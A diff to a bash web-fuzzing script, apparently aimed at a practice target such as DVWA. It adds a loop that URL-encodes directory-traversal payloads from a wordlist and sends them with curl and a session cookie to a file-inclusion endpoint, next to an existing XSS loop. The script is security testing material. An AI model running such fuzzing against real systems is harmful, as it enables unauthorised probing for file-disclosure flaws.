@@ -90,3 +90,22 @@ while IFS= read -r PAYLOAD || [ -n "$PAYLOAD" ]; do
 
   echo "[XSS] Payload: $PAYLOAD | Status: $RESPONSE"
 done <"$XSS_WORDLIST"
+
+# --- Directory Traversal Fuzzing ---
+DT_WORDLIST="directory-traversal.txt"
+echo -e "\n[*] Starting Directory Traversal fuzzing..."
+
+if [ ! -f "$DT_WORDLIST" ]; then
+    echo "[!] Wordlist file '$DT_WORDLIST' not found."
+else
+    while IFS= read -r PAYLOAD || [ -n "$PAYLOAD" ]; do
+        ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
+        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
+            -b "$COOKIE_STR" \
+            "$BASE_URL/vulnerabilities/fi/?page=${ENCODED}")
+
+        echo "[DT] Payload: $PAYLOAD | Status: $RESPONSE"
+
+    done <"$DT_WORDLIST"
+    echo "[*] Directory Traversal fuzzing completed."
+fi
